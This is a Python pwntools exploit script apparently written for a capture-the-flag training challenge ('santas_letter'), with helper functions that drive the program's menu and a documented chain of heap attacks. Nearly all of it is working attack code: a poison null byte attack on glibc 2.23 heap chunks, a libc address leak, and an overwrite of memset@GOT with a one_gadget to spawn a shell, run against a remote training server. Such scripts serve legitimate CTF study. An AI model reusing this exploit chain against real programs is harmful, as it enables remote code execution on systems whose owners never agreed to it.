from pwn import *

# Santa asks for your name and then allows you to add, remove, and edit wishes. You can also prepare a letter and write it. If you write a name you already wrote before, you can work on what you've done before (and add more), otherwise a new child is created.
# Explot saved snprintf ret value svaed as the length of the written letter to perform poison null byte attack, then leak libc address and perform again the attack to overwrite a child wish, modify it to overwrite the address of memset@GOT with the address of a one_gadget and trigger the magic

CHALL_PATH = "./santas_letter_patched"
CHALL = ELF(CHALL_PATH, checksec = False)
LIBC_PATH = "/home/merk/odc/env/libc-2.23.so"
LIBC = ELF(LIBC_PATH, checksec = False)
COMMANDS = """
b edit_wish
"""
# COMMANDS = """
# b calloc_check
# b remove_wish
# c
# """
# COMMANDS = """
# b meet_santa
# b *ask_santa+17
# b *write_letter+271
# b add_wish
# b remove_wish
# b prepare_letter
# b finish
# c
# """

def add_wish(c, size, wish) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode("utf-8"))
    c.recvuntil(b"Wish: ")
    c.send(wish)
    print(c.recvline())
    # return index

def remove_wish(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'2')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    # print(c.recvline())

def edit_wish(c, index, wish) :
    c.recvuntil(b"> ")
    c.sendline(b'3')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    c.recvuntil(b"New wish: ")
    c.sendline(wish)
    # print(c.recvline())

def print_wishes(c, n) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    wishes = {}
    c.recvuntil(b"wishes:\n")

    for i in range(n) :
        wishes[i] = c.recvline()

    return wishes

def prepare_letter(c, size) :
    c.recvuntil(b"> ")
    c.sendline(b'5')
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode("utf-8"))
    # print(c.recvline())

def write_letter(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'6')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    letter = ''
    # print("Letter:")

    while (True) :
        line = c.recvline().decode("utf-8")
        letter += line
        # print(line, end = '')

        if (line.__contains__("With love")) :
            break
        
    return letter

def delete_letter(c) :
    c.recvuntil(b"> ")
    c.sendline(b'7')
    print(c.recvline())

def finish() :
    c.recvuntil(b"> ")
    c.sendline(b'8')
    print(c.recvline())

def poison_null_byte(c, prev_wishes) :
    # Preparing for poison null byte
    add_wish(c, 0x241, b'A'*0x240)              # Index 0 + prev_wishes
    prepare_letter(c, 0x658)                    # Chunk A
    add_wish(c, 0x250, b'B'*0x1f0 + p64(0x200)) # Index 1 + prev_wishes, Chunk B
    add_wish(c, 0x200, b'C'*0x1ff)              # Index 2 + prev_wishes, Chunk C
    add_wish(c, 0xa0, b'X'*0x1f)                # Index 3 + prev_wishes, avoids C going to the topchunk (and so also B)

    # Actual poison null byte
    remove_wish(c, 1 + prev_wishes)     # free(B)
    write_letter(c, 0)                  # Writing on A to overflow on B and change its size
    add_wish(c, 0xa0, b'Y'*0x1f)        # Index 1 + prev_wishes, Chunk B1

    if prev_wishes == 0 :
        add_wish(c, 0x130, b'Z'*0x1f)   # Index 4 + prev_wishes, Chunk B2
    else :
        finish()

        # Second children - Soryu Asuka Langley
        c.recvuntil(b"Name: ")
        c.send(b"Soryu Asuka")          # New child, Chunk B2
        print(c.recvline())
        add_wish(c, 0x10, b'Z'*0xf)     # Creating the first wish to be modified later on
        finish()

        # First children - Ayanami Rei
        c.recvuntil(b"Name: ")
        c.send(b'R'*0x1f)
        print(c.recvline())

    # print("Chunk B2: ", hex(ord(b'Z')))
    remove_wish(c, 1 + prev_wishes)     # Free(B1)
    remove_wish(c, 2 + prev_wishes)     # Free(C)

if args.REMOTE:
    c = remote("santas-letter.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

# First children - Ayanami Rei
c.recvuntil(b"Name: ")
c.send(b'R'*0x1f)
poison_null_byte(c, 0)

# Leak libc address
add_wish(c, 0xa0, b'K'*0x9f)    # Index 1 + prev_wishes, this ovewrites the metadata of B2 with 8 null bytes (prev_inuse) and the theoretical size of the next free chunk (whick partially overlaps with B2). It also overwrites the first 16 bytes of B2 with the pointer to the main arena (because next free chunk is perceived as bigger than a fastbin)
wishes = print_wishes(c, 4)     # chunk B2 now contains the pointer to the main arena
# print(wishes)
leak = wishes[3][4:10].ljust(8, b"\x00")    # we are leaking the pointer to the main arena by getting it from the chunk B2 (4th wish)
leak = u64(leak)
print("LIBC leak: ", hex(leak))
LIBC.address = leak - 0x3c4b78              # manually done in ipython [leaked address - libc base address got with vmmap]
print("LIBC base: ", hex(LIBC.address))

if LIBC.address :
    # fastbin dup (works even if B2 is not a fastbin) - Useless because we exploit pnb on another child
    # add_wish(c, 0x60, b'9')     # Index 2, this overlaps the start of B2
    # add_wish(c, 0x60, b'W')     # Index 5, preventing  double free being detected
    # remove_wish(c, 2)
    # remove_wish(c, 5)
    # remove_wish(c, 4)

    # Allocating chunks to fill the unsortedbin created before (it gives problems when performing future attacks)
    add_wish(c, 0x200, b'F'*0x1ff)  # Filler
    add_wish(c, 0x1a0, b'F'*0x19f)  # Filler

    # Deleting the letter because we need to perform another poison null byte attack, so we mustn't have any letter prepared (also, filling the empty space left by the letter with wishes)
    delete_letter(c)
    add_wish(c, 0x230, b'F'*0x1f)   # Filler
    add_wish(c, 0x200, b'F'*0x1f)   # Filler
    add_wish(c, 0x200, b'F'*0x1f)   # Filler

    poison_null_byte(c, 9)
    finish()                        # Entering as the third child (the one involved in the pnb)

    gadget = LIBC.address + 0x4527a
    print("Gadget addr: ", hex(gadget))

    # Second children - Soryu Asuka Langley
    c.recvuntil(b"Name: ")
    c.send(b"Soryu Asuka")
    print(c.recvline())
    add_wish(c, 0xd0, b'K'*0xb8 + p64(0x603050))    # memset@GOT    (LIBC.got["memset"] does not exist ~ wtf??)
    edit_wish(c, 0, p64(gadget))                    # Overwriting the address of memset@GOT with the address of the gadget
    finish()

    c.interactive()
else :
    print("Null byte in libc address")

# Libc one_gadgets:
# 0x4527a
# 0xf03a4
# 0xf1247